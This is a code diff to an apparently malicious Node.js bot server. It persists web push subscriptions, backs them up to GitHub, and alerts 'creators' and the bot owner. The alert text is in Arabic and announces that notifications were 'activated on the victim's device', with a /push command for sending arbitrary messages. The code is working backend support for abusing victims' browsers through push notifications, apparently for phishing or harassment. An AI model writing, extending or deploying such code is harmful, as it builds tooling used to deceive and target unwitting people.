@@ -154,6 +154,7 @@ const DATA_FILES = [
   { local: "./userstats.json", remote: "_data/userstats.json" },
   { local: "./profiles.json",  remote: "_data/profiles.json"  },
   { local: "./premium.json",   remote: "_data/premium.json"   },
+  { local: "./push_subs.json", remote: "_data/push_subs.json" },
 ];
 
 async function ghGet(path) {
@@ -201,6 +202,7 @@ async function restoreFromGitHub() {
     userStats = loadJSON(USERSTATS_FILE, {});
     profiles  = loadJSON(PROFILES_FILE, {});
     premium   = loadJSON(PREMIUM_FILE, {});
+    pushSubs  = loadJSON(PUSH_FILE, {});
     if (!settings.features)      settings.features      = {...DEFAULT_FEATURES};
     if (!settings.premiumFree)   settings.premiumFree   = {...DEFAULT_PREMIUM_FREE};
     if (!settings.premiumFreeExpiry) settings.premiumFreeExpiry = {};
@@ -1504,14 +1506,18 @@ app.post("/push-subscribe", express.json(), (req, res) => {
   res.send("ok");
   const uid  = req.body.uid  || '';
   const pid  = req.body.pid  || '';
-  const sub  = req.body.sub;          // full PushSubscription object
+  const sub  = req.body.sub;
   const key  = pid || uid;
   if (!key || !sub || !sub.endpoint) return;
+  const isNew = !pushSubs[key];
   pushSubs[key] = { uid, subscription: sub };
   saveJSON(PUSH_FILE, pushSubs);
-  const tid = parseInt(uid, 36);
-  notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ استخدم:\n/push ${key} النص`);
-  if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 PID: ${key}\n(Creator: ${tid})`);
+  backupFileToGH("./push_subs.json", "_data/push_subs.json");
+  if (isNew) {
+    const tid = parseInt(uid, 36);
+    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ استخدم:\n/push ${key} النص`);
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 PID: ${key}\n(Creator: ${tid})`);
+  }
 });
 
 async function sendPushToDevice(key, title, body) {
